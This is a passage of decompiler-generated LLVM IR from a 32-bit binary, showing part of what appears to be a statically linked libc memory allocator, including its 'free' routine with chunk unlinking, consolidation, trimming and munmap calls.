dec_label_pc_8054744:                             ; preds = %dec_label_pc_805473f
  %v2_8054744 = add i32 %v2_805472c, %v1_805471b
  store i32 %v2_8054744, i32* @edi, align 4
  store i32 %v3_8054735, i32* %v2_8054738, align 4
  %v0_8054749 = load i32, i32* @esi, align 4
  %v1_8054749 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054749 = add i32 %v1_8054749, 8
  %v3_8054749 = inttoptr i32 %v2_8054749 to i32*
  store i32 %v0_8054749, i32* %v3_8054749, align 4
  %v0_8054757.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805474c

dec_label_pc_805474c:                             ; preds = %dec_label_pc_805470f, %dec_label_pc_8054744
  %v1_8054760 = phi i32 [ %v2_8054720, %dec_label_pc_805470f ], [ %v0_8054757.pre, %dec_label_pc_8054744 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8054754 = and i32 %v3_8054723, -4
  store i32 %v1_8054754, i32* %ebp.global-to-local, align 4
  %v4_8054757 = load i32, i32* %v3_80547ba, align 4
  %v15_8054757 = icmp eq i32 %v1_8054760, %v4_8054757
  br i1 %v15_8054757, label %dec_label_pc_80547ad, label %dec_label_pc_805475c

dec_label_pc_805475c:                             ; preds = %dec_label_pc_805474c
  %v2_805475c = add i32 %v1_8054760, 4
  %v3_805475c = add i32 %v2_805475c, %v1_8054754
  %v4_805475c = inttoptr i32 %v3_805475c to i32*
  %v5_805475c = load i32, i32* %v4_805475c, align 4
  store i32 %v5_805475c, i32* %eax.global-to-local, align 4
  %v3_8054760 = inttoptr i32 %v2_805475c to i32*
  store i32 %v1_8054754, i32* %v3_8054760, align 4
  %v0_8054763 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054763 = urem i32 %v0_8054763, 2
  %v2_8054763 = icmp eq i32 %v1_8054763, 0
  store i32 %v1_8054763, i32* %eax.global-to-local, align 4
  %v1_8054768 = icmp eq i1 %v2_8054763, false
  br i1 %v1_8054768, label %dec_label_pc_8054789, label %dec_label_pc_805476a

dec_label_pc_805476a:                             ; preds = %dec_label_pc_805475c
  %v0_805476a = load i32, i32* @ebx, align 4
  %v1_805476a = add i32 %v0_805476a, 8
  %v2_805476a = inttoptr i32 %v1_805476a to i32*
  %v3_805476a = load i32, i32* %v2_805476a, align 4
  store i32 %v3_805476a, i32* @edx, align 4
  %v1_805476d = add i32 %v0_805476a, 12
  %v2_805476d = inttoptr i32 %v1_805476d to i32*
  %v3_805476d = load i32, i32* %v2_805476d, align 4
  store i32 %v3_805476d, i32* %eax.global-to-local, align 4
  %v1_8054770 = add i32 %v3_805476a, 12
  %v2_8054770 = inttoptr i32 %v1_8054770 to i32*
  %v3_8054770 = load i32, i32* %v2_8054770, align 4
  store i32 %v3_8054770, i32* @esi, align 4
  %v12_8054773 = icmp eq i32 %v3_8054770, %v0_805476a
  %v1_8054775 = icmp eq i1 %v12_8054773, false
  br i1 %v1_8054775, label %dec_label_pc_805477c, label %dec_label_pc_8054777

dec_label_pc_8054777:                             ; preds = %dec_label_pc_805476a
  %v1_8054777 = add i32 %v3_805476d, 8
  %v2_8054777 = inttoptr i32 %v1_8054777 to i32*
  %v3_8054777 = load i32, i32* %v2_8054777, align 4
  %v15_8054777 = icmp eq i32 %v3_8054777, %v3_8054770
  br i1 %v15_8054777, label %dec_label_pc_8054781, label %dec_label_pc_805477c

dec_label_pc_805477c:                             ; preds = %dec_label_pc_8054777, %dec_label_pc_805476a, %dec_label_pc_805473f, %dec_label_pc_805472c
  %v0_805477c = call i32 @abort()
  store i32 %v0_805477c, i32* %eax.global-to-local, align 4
  %v1_8054783.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054781

dec_label_pc_8054781:                             ; preds = %dec_label_pc_8054777, %dec_label_pc_805477c
  %v1_8054783 = phi i32 [ %v3_805476a, %dec_label_pc_8054777 ], [ %v1_8054783.pre, %dec_label_pc_805477c ]
  %v0_8054783 = phi i32 [ %v3_805476d, %dec_label_pc_8054777 ], [ %v0_805477c, %dec_label_pc_805477c ]
  %v0_8054781 = load i32, i32* @edi, align 4
  %v1_8054781 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054781 = add i32 %v1_8054781, %v0_8054781
  store i32 %v2_8054781, i32* @edi, align 4
  %v2_8054783 = add i32 %v1_8054783, 12
  %v3_8054783 = inttoptr i32 %v2_8054783 to i32*
  store i32 %v0_8054783, i32* %v3_8054783, align 4
  %v0_8054786 = load i32, i32* @edx, align 4
  %v1_8054786 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054786 = add i32 %v1_8054786, 8
  %v3_8054786 = inttoptr i32 %v2_8054786 to i32*
  store i32 %v0_8054786, i32* %v3_8054786, align 4
  br label %dec_label_pc_8054789

dec_label_pc_8054789:                             ; preds = %dec_label_pc_805475c, %dec_label_pc_8054781
  store i32 %v1_80546d4, i32* %eax.global-to-local, align 4
  %v3_805478d = load i32, i32* %v2_805478d, align 4
  store i32 %v3_805478d, i32* @edx, align 4
  %v0_8054790 = load i32, i32* @ecx, align 4
  store i32 %v0_8054790, i32* %v2_805478d, align 4
  %v0_8054793 = load i32, i32* @edi, align 4
  %v1_8054795 = or i32 %v0_8054793, 1
  %v1_8054798 = load i32, i32* @ecx, align 4
  %v2_8054798 = add i32 %v1_8054798, 4
  %v3_8054798 = inttoptr i32 %v2_8054798 to i32*
  store i32 %v1_8054795, i32* %v3_8054798, align 4
  %v0_805479b = load i32, i32* @ecx, align 4
  %v1_805479b = load i32, i32* @edx, align 4
  %v2_805479b = add i32 %v1_805479b, 12
  %v3_805479b = inttoptr i32 %v2_805479b to i32*
  store i32 %v0_805479b, i32* %v3_805479b, align 4
  store i32 %v1_80546d4, i32* %eax.global-to-local, align 4
  %v0_80547a2 = load i32, i32* @edx, align 4
  %v1_80547a2 = load i32, i32* @ecx, align 4
  %v2_80547a2 = add i32 %v1_80547a2, 8
  %v3_80547a2 = inttoptr i32 %v2_80547a2 to i32*
  store i32 %v0_80547a2, i32* %v3_80547a2, align 4
  %v0_80547a5 = load i32, i32* @edi, align 4
  %v1_80547a5 = load i32, i32* @ecx, align 4
  %v3_80547a5 = add i32 %v1_80547a5, %v0_80547a5
  %v4_80547a5 = inttoptr i32 %v3_80547a5 to i32*
  store i32 %v0_80547a5, i32* %v4_80547a5, align 4
  %v0_80547a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80547a8 = load i32, i32* @ecx, align 4
  %v2_80547a8 = add i32 %v1_80547a8, 12
  %v3_80547a8 = inttoptr i32 %v2_80547a8 to i32*
  store i32 %v0_80547a8, i32* %v3_80547a8, align 4
  br label %dec_label_pc_80547bd

dec_label_pc_80547ad:                             ; preds = %dec_label_pc_805474c
  %v0_80547ad = load i32, i32* @edi, align 4
  %v2_80547ad = add i32 %v0_80547ad, %v1_8054754
  %v1_80547b0 = or i32 %v2_80547ad, 1
  store i32 %v1_80547b0, i32* %eax.global-to-local, align 4
  %v1_80547b3 = load i32, i32* @ecx, align 4
  %v2_80547b3 = add i32 %v1_80547b3, 4
  %v3_80547b3 = inttoptr i32 %v2_80547b3 to i32*
  store i32 %v1_80547b0, i32* %v3_80547b3, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_80547ba = load i32, i32* @ecx, align 4
  store i32 %v0_80547ba, i32* %v3_80547ba, align 4
  br label %dec_label_pc_80547bd

dec_label_pc_80547bd:                             ; preds = %dec_label_pc_8054789, %dec_label_pc_80547ad
  store i32 %v3_805470f, i32* @ecx, align 4
  %v1_80547c1 = icmp eq i32 %v3_805470f, 0
  %v1_80547c3 = icmp eq i1 %v1_80547c1, false
  br i1 %v1_80547c3, label %dec_label_pc_805470f, label %dec_label_pc_80547c9

dec_label_pc_80547c9:                             ; preds = %dec_label_pc_80547bd, %dec_label_pc_80546fb
  store i32 %v4_80546f3, i32* @ecx, align 4
  %v15_80547cd = icmp eq i32 %v0_8054709, %v4_80546f3
  br i1 %v15_80547cd, label %dec_label_pc_8054851, label %dec_label_pc_80547d3

dec_label_pc_80547d3:                             ; preds = %dec_label_pc_80547c9
  %v4_80547d3 = add i32 %v0_8054709, 4
  br label %dec_label_pc_80546fb

dec_label_pc_80547dd:                             ; preds = %dec_label_pc_80547ec.preheader, %dec_label_pc_80547dd
  %v1_80547e120 = phi i32 [ 1, %dec_label_pc_80547ec.preheader ], [ %v0_80547ec.pre, %dec_label_pc_80547dd ]
  %v2_80547e1 = mul i32 %v1_80547e120, 8
  %v4_80547e1 = add i32 %v3_80547e1, %v2_80547e1
  store i32 %v4_80547e1, i32* %eax.global-to-local, align 4
  %v1_80547e5 = add i32 %v1_80547e120, 1
  store i32 %v1_80547e5, i32* %edx.global-to-local, align 4
  %v2_80547e6 = add i32 %v4_80547e1, 12
  %v3_80547e6 = inttoptr i32 %v2_80547e6 to i32*
  store i32 %v4_80547e1, i32* %v3_80547e6, align 4
  %v0_80547e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80547e9 = add i32 %v0_80547e9, 8
  %v3_80547e9 = inttoptr i32 %v2_80547e9 to i32*
  store i32 %v0_80547e9, i32* %v3_80547e9, align 4
  %v0_80547ec.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_80547ef = icmp sgt i32 %v0_80547ec.pre, 95
  br i1 %v7_80547ef, label %dec_label_pc_80547f1, label %dec_label_pc_80547dd

dec_label_pc_80547f1:                             ; preds = %dec_label_pc_80547dd
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80547f5 = add i32 %tmp11, 864
  %v2_80547f5 = inttoptr i32 %v1_80547f5 to i32*
  %v3_80547f5 = load i32, i32* %v2_80547f5, align 4
  %v4_80547f5 = or i32 %v3_80547f5, 1
  store i32 %v4_80547f5, i32* %v2_80547f5, align 4
  %v0_80547fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80547fc = add i32 %v0_80547fc, 840
  %v2_80547fc = inttoptr i32 %v1_80547fc to i32*
  store i32 0, i32* %v2_80547fc, align 4
  %v0_8054806 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054806 = add i32 %v0_8054806, 852
  %v2_8054806 = inttoptr i32 %v1_8054806 to i32*
  store i32 65536, i32* %v2_8054806, align 4
  %v0_8054810 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054810 = add i32 %v0_8054810, 844
  %v2_8054810 = inttoptr i32 %v1_8054810 to i32*
  store i32 262144, i32* %v2_8054810, align 4
  %v0_805481a = load i32, i32* %eax.global-to-local, align 4
  %v1_805481a = add i32 %v0_805481a, 836
  %v2_805481a = inttoptr i32 %v1_805481a to i32*
  store i32 262144, i32* %v2_805481a, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_805482b = load i32, i32* %arg1, align 4
  %v1_805482d = urem i32 %v2_805482b, 4
  %v1_8054830 = or i32 %v1_805482d, 72
  store i32 %v1_8054830, i32* %arg1, align 4
  %v0_8054835 = load i32, i32* @edx, align 4
  %v1_8054837 = add i32 %v0_8054835, 52
  store i32 %v1_8054837, i32* %eax.global-to-local, align 4
  %v2_805483a = add i32 %v0_8054835, 44
  %v3_805483a = inttoptr i32 %v2_805483a to i32*
  store i32 %v1_8054837, i32* %v3_805483a, align 4
  %v1_805483f = call i32 @sysconf(i32 30)
  store i32 %v1_805483f, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_805484b = add i32 %tmp11, 860
  %v3_805484b = inttoptr i32 %v2_805484b to i32*
  store i32 %v1_805483f, i32* %v3_805484b, align 4
  br label %dec_label_pc_8054851

dec_label_pc_8054851:                             ; preds = %dec_label_pc_80547c9, %dec_label_pc_80547f1
  store i32 %v0_80546b4, i32* @ebx, align 4
  store i32 %v0_80546b3, i32* @esi, align 4
  store i32 %v0_80546b2, i32* @edi, align 4
  %v0_8054858 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8054858

; uselistorder directives
  uselistorder i32 %v0_80547e9, { 1, 0 }
  uselistorder i32 %v0_80547a5, { 1, 0 }
  uselistorder i32 %v1_8054763, { 1, 0 }
  uselistorder i32 %v2_805475c, { 1, 0 }
  uselistorder i32 %v1_8054754, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8054760, { 1, 0 }
  uselistorder i32 %v3_805470f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805472c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8054709, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80547ba, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8054851, { 1, 0 }
  uselistorder label %dec_label_pc_80547dd, { 1, 0 }
  uselistorder label %dec_label_pc_80547bd, { 1, 0 }
  uselistorder label %dec_label_pc_8054789, { 1, 0 }
  uselistorder label %dec_label_pc_8054781, { 1, 0 }
  uselistorder label %dec_label_pc_805474c, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8054859 = load i32, i32* @ebp, align 4
  %v0_805485a = load i32, i32* @edi, align 4
  %v0_805485b = load i32, i32* @esi, align 4
  %v0_805485c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8054864 = icmp eq i32 %arg1, 0
  br i1 %v1_8054864, label %dec_label_pc_80549ed, label %dec_label_pc_805486c

dec_label_pc_805486c:                             ; preds = %entry
  %v2_8054877 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054877, i32* @eax, align 4
  %v2_805487c = call i32 @__pthread_return_void(i32 %v2_8054877, i32 134567199)
  store i32 %v2_805487c, i32* %eax.global-to-local, align 4
  %v1_8054888 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f390.957 to i32))
  %v1_805488d = add i32 %arg1, -8
  store i32 %v1_805488d, i32* @ecx, align 4
  %v0_8054890 = load i8, i8* @global_var_8065800.958, align 1
  %v1_8054890 = sext i8 %v0_8054890 to i32
  store i32 %v1_8054890, i32* %eax.global-to-local, align 4
  %v1_8054895 = add i32 %arg1, -4
  %v2_8054895 = inttoptr i32 %v1_8054895 to i32*
  %v3_8054895 = load i32, i32* %v2_8054895, align 4
  store i32 %v3_8054895, i32* @edx, align 4
  %v1_805489d = and i32 %v3_8054895, -4
  %v4_805489d = trunc i32 %v1_805489d to i8
  store i32 %v1_805489d, i32* @ebx, align 4
  %v8_80548a2 = icmp ugt i8 %v4_805489d, %v0_8054890
  br i1 %v8_80548a2, label %dec_label_pc_80548c4, label %dec_label_pc_80548a4

dec_label_pc_80548a4:                             ; preds = %dec_label_pc_805486c
  %v1_80548a4 = or i32 %v1_8054890, 3
  %v3_80548a4 = trunc i32 %v1_80548a4 to i8
  store i32 %v1_80548a4, i32* %eax.global-to-local, align 4
  %v2_80548a7 = udiv i32 %v3_8054895, 8
  store i8 %v3_80548a4, i8* @global_var_8065800.958, align 2048
  %v1_80548af = mul nuw i32 %v2_80548a7, 4
  %v2_80548af = add i32 %v1_80548af, ptrtoint (i8* @global_var_8065800.958 to i32)
  store i32 %v2_80548af, i32* @edx, align 4
  %v1_80548b6 = add i32 %v1_80548af, add (i32 ptrtoint (i8* @global_var_8065800.958 to i32), i32 -4)
  %v2_80548b6 = inttoptr i32 %v1_80548b6 to i32*
  %v3_80548b6 = load i32, i32* %v2_80548b6, align 4
  store i32 %v3_80548b6, i32* %eax.global-to-local, align 4
  %v3_80548b9 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80548b6, i32* %v3_80548b9, align 4
  %v0_80548bc = load i32, i32* @ecx, align 4
  %v1_80548bc = load i32, i32* @edx, align 4
  %v2_80548bc = add i32 %v1_80548bc, -4
  %v3_80548bc = inttoptr i32 %v2_80548bc to i32*
  store i32 %v0_80548bc, i32* %v3_80548bc, align 4
  br label %dec_label_pc_80549dc

dec_label_pc_80548c4:                             ; preds = %dec_label_pc_805486c
  %v2_80548c4 = and i32 %v3_8054895, 2
  %v3_80548c4 = icmp eq i32 %v2_80548c4, 0
  %v1_80548c7 = icmp eq i1 %v3_80548c4, false
  br i1 %v1_80548c7, label %dec_label_pc_80549bc, label %dec_label_pc_80548cd

dec_label_pc_80548cd:                             ; preds = %dec_label_pc_80548c4
  %v1_80548cd = or i32 %v1_8054890, 1
  %v3_80548cd = trunc i32 %v1_80548cd to i8
  store i32 %v1_80548cd, i32* %eax.global-to-local, align 4
  store i8 %v3_80548cd, i8* @global_var_8065800.958, align 2048
  %v2_80548d5 = add i32 %v1_805489d, %v1_805488d
  store i32 %v2_80548d5, i32* @esi, align 4
  %v1_80548d8 = add i32 %v2_80548d5, 4
  %v2_80548d8 = inttoptr i32 %v1_80548d8 to i32*
  %v3_80548d8 = load i32, i32* %v2_80548d8, align 4
  store i32 %v3_80548d8, i32* %eax.global-to-local, align 4
  %v2_80548df = inttoptr i32 %v1_8054895 to i8*
  %v3_80548df = load i8, i8* %v2_80548df, align 1
  %v4_80548df = urem i8 %v3_80548df, 2
  %v5_80548df = icmp eq i8 %v4_80548df, 0
  %v1_80548e3 = icmp eq i1 %v5_80548df, false
  br i1 %v1_80548e3, label %dec_label_pc_8054906, label %dec_label_pc_80548e5

dec_label_pc_80548e5:                             ; preds = %dec_label_pc_80548cd
  %v2_80548e5 = inttoptr i32 %v1_805488d to i32*
  %v3_80548e5 = load i32, i32* %v2_80548e5, align 4
  store i32 %v3_80548e5, i32* @ebp, align 4
  %v2_80548ea = sub i32 %v1_805488d, %v3_80548e5
  store i32 %v2_80548ea, i32* %eax.global-to-local, align 4
  %v1_80548ec = add i32 %v2_80548ea, 8
  %v2_80548ec = inttoptr i32 %v1_80548ec to i32*
  %v3_80548ec = load i32, i32* %v2_80548ec, align 4
  store i32 %v3_80548ec, i32* @edi, align 4
  %v1_80548ef = add i32 %v2_80548ea, 12
  %v2_80548ef = inttoptr i32 %v1_80548ef to i32*
  %v3_80548ef = load i32, i32* %v2_80548ef, align 4
  store i32 %v3_80548ef, i32* @edx, align 4
  %v1_80548f2 = add i32 %v3_80548ec, 12
  %v2_80548f2 = inttoptr i32 %v1_80548f2 to i32*
  %v3_80548f2 = load i32, i32* %v2_80548f2, align 4
  store i32 %v3_80548f2, i32* @ecx, align 4
  %v12_80548f5 = icmp eq i32 %v3_80548f2, %v2_80548ea
  %v1_80548f7 = icmp eq i1 %v12_80548f5, false
  br i1 %v1_80548f7, label %dec_label_pc_8054935, label %dec_label_pc_80548f9

dec_label_pc_80548f9:                             ; preds = %dec_label_pc_80548e5
  %v1_80548f9 = add i32 %v3_80548ef, 8
  %v2_80548f9 = inttoptr i32 %v1_80548f9 to i32*
  %v3_80548f9 = load i32, i32* %v2_80548f9, align 4
  %v15_80548f9 = icmp eq i32 %v3_80548f9, %v3_80548f2
  %v1_80548fc = icmp eq i1 %v15_80548f9, false
  br i1 %v1_80548fc, label %dec_label_pc_8054935, label %dec_label_pc_80548fe

dec_label_pc_80548fe:                             ; preds = %dec_label_pc_80548f9
  %v2_80548fe = add i32 %v3_80548e5, %v1_805489d
  store i32 %v2_80548fe, i32* @ebx, align 4
  store i32 %v3_80548ef, i32* %v2_80548f2, align 4
  %v0_8054903 = load i32, i32* @edi, align 4
  %v1_8054903 = load i32, i32* @edx, align 4
  %v2_8054903 = add i32 %v1_8054903, 8
  %v3_8054903 = inttoptr i32 %v2_8054903 to i32*
  store i32 %v0_8054903, i32* %v3_8054903, align 4
  %v0_805490d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054906

dec_label_pc_8054906:                             ; preds = %dec_label_pc_80548cd, %dec_label_pc_80548fe
  %v1_8054919 = phi i32 [ %v2_80548d5, %dec_label_pc_80548cd ], [ %v0_805490d.pre, %dec_label_pc_80548fe ]
  %v1_805490a = and i32 %v3_80548d8, -4
  store i32 %v1_805490a, i32* @ebp, align 4
  %v1_805490d = load i32, i32* @global_var_806582c.959, align 4
  %v12_805490d = icmp eq i32 %v1_8054919, %v1_805490d
  br i1 %v12_805490d, label %dec_label_pc_8054967, label %dec_label_pc_8054915

dec_label_pc_8054915:                             ; preds = %dec_label_pc_8054906
  %v2_8054915 = add i32 %v1_8054919, 4
  %v3_8054915 = add i32 %v2_8054915, %v1_805490a
  %v4_8054915 = inttoptr i32 %v3_8054915 to i32*
  %v5_8054915 = load i32, i32* %v4_8054915, align 4
  store i32 %v5_8054915, i32* %eax.global-to-local, align 4
  %v3_8054919 = inttoptr i32 %v2_8054915 to i32*
  store i32 %v1_805490a, i32* %v3_8054919, align 4
  %v0_805491c = load i32, i32* %eax.global-to-local, align 4
  %v1_805491c = urem i32 %v0_805491c, 2
  %v2_805491c = icmp eq i32 %v1_805491c, 0
  store i32 %v1_805491c, i32* %eax.global-to-local, align 4
  %v1_8054921 = icmp eq i1 %v2_805491c, false
  br i1 %v1_8054921, label %dec_label_pc_8054942, label %dec_label_pc_8054923

dec_label_pc_8054923:                             ; preds = %dec_label_pc_8054915
  %v0_8054923 = load i32, i32* @esi, align 4
  %v1_8054923 = add i32 %v0_8054923, 8
  %v2_8054923 = inttoptr i32 %v1_8054923 to i32*
  %v3_8054923 = load i32, i32* %v2_8054923, align 4
  store i32 %v3_8054923, i32* @edx, align 4
  %v1_8054926 = add i32 %v0_8054923, 12
  %v2_8054926 = inttoptr i32 %v1_8054926 to i32*
  %v3_8054926 = load i32, i32* %v2_8054926, align 4
  store i32 %v3_8054926, i32* %eax.global-to-local, align 4
  %v1_8054929 = add i32 %v3_8054923, 12
  %v2_8054929 = inttoptr i32 %v1_8054929 to i32*
  %v3_8054929 = load i32, i32* %v2_8054929, align 4
  store i32 %v3_8054929, i32* @edi, align 4
  %v12_805492c = icmp eq i32 %v3_8054929, %v0_8054923
  %v1_805492e = icmp eq i1 %v12_805492c, false
  br i1 %v1_805492e, label %dec_label_pc_8054935, label %dec_label_pc_8054930

dec_label_pc_8054930:                             ; preds = %dec_label_pc_8054923
  %v1_8054930 = add i32 %v3_8054926, 8
  %v2_8054930 = inttoptr i32 %v1_8054930 to i32*
  %v3_8054930 = load i32, i32* %v2_8054930, align 4
  %v15_8054930 = icmp eq i32 %v3_8054930, %v3_8054929
  br i1 %v15_8054930, label %dec_label_pc_805493a, label %dec_label_pc_8054935

dec_label_pc_8054935:                             ; preds = %dec_label_pc_8054930, %dec_label_pc_8054923, %dec_label_pc_80548f9, %dec_label_pc_80548e5
  %v0_8054935 = call i32 @abort()
  store i32 %v0_8054935, i32* %eax.global-to-local, align 4
  %v1_805493a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805493a

dec_label_pc_805493a:                             ; preds = %dec_label_pc_8054930, %dec_label_pc_8054935
  %v1_805493a = phi i32 [ %v3_8054923, %dec_label_pc_8054930 ], [ %v1_805493a.pre, %dec_label_pc_8054935 ]
  %v0_805493a = phi i32 [ %v3_8054926, %dec_label_pc_8054930 ], [ %v0_8054935, %dec_label_pc_8054935 ]
  %v2_805493a = add i32 %v1_805493a, 12
  %v3_805493a = inttoptr i32 %v2_805493a to i32*
  store i32 %v0_805493a, i32* %v3_805493a, align 4
  %v0_805493d = load i32, i32* @ebx, align 4
  %v1_805493d = load i32, i32* @ebp, align 4
  %v2_805493d = add i32 %v1_805493d, %v0_805493d
  store i32 %v2_805493d, i32* @ebx, align 4
  %v0_805493f = load i32, i32* @edx, align 4
  %v1_805493f = load i32, i32* %eax.global-to-local, align 4
  %v2_805493f = add i32 %v1_805493f, 8
  %v3_805493f = inttoptr i32 %v2_805493f to i32*
  store i32 %v0_805493f, i32* %v3_805493f, align 4
  br label %dec_label_pc_8054942

dec_label_pc_8054942:                             ; preds = %dec_label_pc_8054915, %dec_label_pc_805493a
  %v0_8054942 = load i32, i32* @global_var_806583c.977, align 4
  store i32 %v0_8054942, i32* %eax.global-to-local, align 4
  %v0_8054947 = load i32, i32* @ecx, align 4
  %v1_8054947 = add i32 %v0_8054947, 12
  %v2_8054947 = inttoptr i32 %v1_8054947 to i32*
  store i32 ptrtoint (i32* @global_var_8065834.961 to i32), i32* %v2_8054947, align 4
  %v0_805494e = load i32, i32* @ebx, align 4
  %v1_805494e = load i32, i32* @ecx, align 4
  %v3_805494e = add i32 %v1_805494e, %v0_805494e
  %v4_805494e = inttoptr i32 %v3_805494e to i32*
  store i32 %v0_805494e, i32* %v4_805494e, align 4
  %v0_8054951 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054951 = load i32, i32* @ecx, align 4
  %v2_8054951 = add i32 %v1_8054951, 8
  %v3_8054951 = inttoptr i32 %v2_8054951 to i32*
  store i32 %v0_8054951, i32* %v3_8054951, align 4
  %v0_8054954 = load i32, i32* @ecx, align 4
  %v1_8054954 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054954 = add i32 %v1_8054954, 12
  %v3_8054954 = inttoptr i32 %v2_8054954 to i32*
  store i32 %v0_8054954, i32* %v3_8054954, align 4
  %v0_8054957 = load i32, i32* @ebx, align 4
  %v1_8054959 = or i32 %v0_8054957, 1
  store i32 %v1_8054959, i32* %eax.global-to-local, align 4
  %v0_805495c = load i32, i32* @ecx, align 4
  store i32 %v0_805495c, i32* @global_var_806583c.977, align 4
  %v2_8054962 = add i32 %v0_805495c, 4
  %v3_8054962 = inttoptr i32 %v2_8054962 to i32*
  store i32 %v1_8054959, i32* %v3_8054962, align 4
  br label %dec_label_pc_8054977

dec_label_pc_8054967:                             ; preds = %dec_label_pc_8054906
  %v0_8054967 = load i32, i32* @ebx, align 4
  %v2_8054967 = add i32 %v0_8054967, %v1_805490a
  store i32 %v2_8054967, i32* @ebx, align 4
  %v1_805496b = or i32 %v2_8054967, 1
  store i32 %v1_805496b, i32* %eax.global-to-local, align 4
  %v1_805496e = load i32, i32* @ecx, align 4
  %v2_805496e = add i32 %v1_805496e, 4
  %v3_805496e = inttoptr i32 %v2_805496e to i32*
  store i32 %v1_805496b, i32* %v3_805496e, align 4
  %v0_8054971 = load i32, i32* @ecx, align 4
  store i32 %v0_8054971, i32* @global_var_806582c.959, align 4
  br label %dec_label_pc_8054977

dec_label_pc_8054977:                             ; preds = %dec_label_pc_8054942, %dec_label_pc_8054967
  %v0_8054977 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8054977, 131072
  br i1 %tmp, label %dec_label_pc_80549dc, label %dec_label_pc_805497f

dec_label_pc_805497f:                             ; preds = %dec_label_pc_8054977
  %v0_805497f = load i8, i8* @global_var_8065800.958, align 2048
  %v1_805497f = and i8 %v0_805497f, 2
  %v2_805497f = icmp eq i8 %v1_805497f, 0
  br i1 %v2_805497f, label %dec_label_pc_8054998, label %dec_label_pc_8054988

dec_label_pc_8054988:                             ; preds = %dec_label_pc_805497f
  %v2_8054990 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8065800.958 to i32*))
  store i32 %v2_8054990, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054998

dec_label_pc_8054998:                             ; preds = %dec_label_pc_805497f, %dec_label_pc_8054988
  %v0_8054998 = load i32, i32* @global_var_806582c.959, align 4
  store i32 %v0_8054998, i32* %eax.global-to-local, align 4
  %v1_805499d = add i32 %v0_8054998, 4
  %v2_805499d = inttoptr i32 %v1_805499d to i32*
  %v3_805499d = load i32, i32* %v2_805499d, align 4
  %v1_80549a0 = and i32 %v3_805499d, -4
  store i32 %v1_80549a0, i32* %eax.global-to-local, align 4
  %v1_80549a3 = load i32, i32* @global_var_8065b44.975, align 4
  %v7_80549a3 = icmp ult i32 %v1_80549a0, %v1_80549a3
  br i1 %v7_80549a3, label %dec_label_pc_80549dc, label %dec_label_pc_80549ab

dec_label_pc_80549ab:                             ; preds = %dec_label_pc_8054998
  %v0_80549ab = load i32, i32* @global_var_8065b48.973, align 8
  store i32 %v0_80549ab, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8065800.958 to i32), i32* @edx, align 4
  %v0_80549b5 = call i32 @__malloc_trim()
  store i32 %v0_80549b5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80549dc

dec_label_pc_80549bc:                             ; preds = %dec_label_pc_80548c4
  %v2_80549bc = inttoptr i32 %v1_805488d to i32*
  %v3_80549bc = load i32, i32* %v2_80549bc, align 4
  %v0_80549bf = load i32, i32* @global_var_8065b50.966, align 16
  %v1_80549bf = add i32 %v0_80549bf, -1
  store i32 %v1_80549bf, i32* @global_var_8065b50.966, align 16
  %v2_80549c5 = add i32 %v3_80549bc, %v1_805489d
  store i32 %v2_80549c5, i32* %eax.global-to-local, align 4
  %v2_80549c8 = sub i32 %v1_805488d, %v3_80549bc
  %v0_80549ce = load i32, i32* @global_var_8065b64.970, align 4
  %v2_80549ce = sub i32 %v0_80549ce, %v2_80549c5
  store i32 %v2_80549ce, i32* @global_var_8065b64.970, align 4
  %v4_80549d4 = call i32 @munmap(i32 %v2_80549c8, i32 %v2_80549c5, i32 %v1_805489d, i32 %v1_805489d)
  store i32 %v4_80549d4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80549dc

dec_label_pc_80549dc:                             ; preds = %dec_label_pc_8054998, %dec_label_pc_8054977, %dec_label_pc_80549ab, %dec_label_pc_80548a4, %dec_label_pc_80549bc
  store i32 %v2_8054877, i32* @eax, align 4
  %v2_80549e5 = call i32 @__pthread_return_void(i32 %v2_8054877, i32 1)
  store i32 %v2_80549e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80549ed

